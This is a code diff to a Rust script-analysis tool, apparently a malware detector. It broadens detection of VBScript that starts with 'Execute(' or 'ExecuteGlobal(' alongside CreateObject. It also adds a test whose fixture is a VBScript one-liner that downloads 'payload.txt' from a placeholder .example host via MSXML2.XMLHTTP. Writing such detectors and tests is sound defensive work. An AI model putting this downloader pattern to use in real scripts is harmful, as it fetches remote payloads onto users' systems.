@@ -2966,7 +2966,10 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || (first.starts_with("const ") && !looks_like_js_script(lower))
         || (first.starts_with("set ") && first.contains("createobject"))
         || (first.starts_with("with ") && first.contains("createobject"))
-        || ((first.starts_with("execute ") || first.starts_with("executeglobal "))
+        || ((first.starts_with("execute ")
+            || first.starts_with("execute(")
+            || first.starts_with("executeglobal ")
+            || first.starts_with("executeglobal("))
             && first.contains("createobject"))
         || first.starts_with("option explicit")
         || first.starts_with("private function")
@@ -14445,6 +14448,30 @@ End With"#;
             report
                 .deobfuscated
                 .contains("Execute \"Set http = CreateObject"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_executeglobal_paren_prefix_xmlhttp_url_extracted() {
+        let vbs = br#"ExecuteGlobal("Set http = CreateObject(""MSXML2.XMLHTTP""): http.Open ""GET"", ""https://standalone-vbs-executeglobal.example/payload.txt"", False: http.Send")"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-vbs-executeglobal.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with ExecuteGlobal paren prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("ExecuteGlobal(\"Set http = CreateObject"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
